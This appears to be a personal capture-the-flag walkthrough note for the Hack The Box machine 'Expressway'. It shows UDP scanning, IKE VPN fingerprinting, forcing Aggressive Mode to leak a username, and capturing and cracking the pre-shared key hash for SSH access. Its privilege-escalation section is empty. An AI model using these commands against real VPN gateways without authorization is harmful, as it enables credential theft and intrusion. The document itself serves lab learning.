
2025-10-25 18:40

Source: #htb #Boot2root 

Tags: 
### Enumeration 

Rustscan only shows port 22 open, When TCP fails, we turn to its connectionless counterpart, UDP.

```sh
udpx -t 10.129.13.112 -c 128 -w 1000 
```
- `-c`: Concurrency level
- `-w`: Wait time in milliseconds

----
UDP scan w [[nmap]]

```sh
nmap -sU -p 68,69,500,4500 -sV --script=ike-version,tftp-enum,broadcast-dhcp-discover -Pn --max-retries 3 --host-timeout 5m 10.10.11.87
```

o/p of UDP scan 
68  open  dhcpc
69  open  tftp
500  open  isakmp
#### Fingerprinting IKE

`ike-scan` - It crafts [[Internet Key Exchange]] packets to fingerprint the VPN gateway and elicit responses that can reveal its configuration, identity, and vulnerabilities.

**Initial Probe (Main Mode):**

```sh
sudo ike-scan expressway.htb
```

**Response:**

```sh
Starting ike-scan 1.9.6 with 1 hosts ([http://www.nta-monitor.com/tools/ike-scan/](http://www.nta-monitor.com/tools/ike-scan/))
10.129.13.112  Main Mode Handshake returned HDR=(CKY-R=1d432c635a2e8d64...)
        SA=(Enc=3DES-CBC Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
```

Response Breakdown:
- **Main Mode Handshake:** The server responded in Main Mode, which is more secure as it protects peer identities.
- **Weak Cryptography:** It supports `3DES` (a legacy, weak cipher), `SHA1` (no longer considered secure), and `Group=2:modp1024` (a weak Diffie-Hellman group susceptible to precomputation attacks).
- **Auth=PSK:** Authentication is done via a **Pre-Shared Key**. This is the secret we need to find.

**Aggressive mode scan** 

IKEv1’s Main Mode uses six messages to protect identities. However, Aggressive Mode cuts this down to three messages for a faster connection, but at the cost of sending the initiator and responder’s identities in the clear. If the server supports it, we can force it into this mode to leak valuable information.

```sh
sudo ike-scan -A expressway.htb
```

The server supports Aggressive Mode and leaked an identity: a Fully Qualified Domain Name of a user, `ike@expressway.htb`. This gives us a valid username.

Now we have a username (`ike`) and know the authentication method is a PSK. The final step is to capture the authentication hash from the Aggressive Mode exchange and crack the PSK offline.
#### Capturing the hash 

`ike-scan` can automatically format the necessary data for cracking with its sister tool, `psk-crack`.

```sh
sudo ike-scan -A expressway.htb --id=ike@expressway.htb -Pike.psk
```
above cmd created a ike.psk 

```sh
psk-crack -d /usr/share/wordlists/rockyou.txt ike.psk
```

reuse these new found creds for ssh access
### Privilege Escalation 






### References
https://app.hackthebox.com/machines/736

https://www.isdadev.at/posts/htb-expressway-writeup/
https://thecybersecguru.com/ctf-walkthroughs/mastering-expressway-beginners-guide-from-hackthebox/

IKE Enum - https://routezero.security/2025/04/06/ike-cheat-sheet-for-pentration-testers/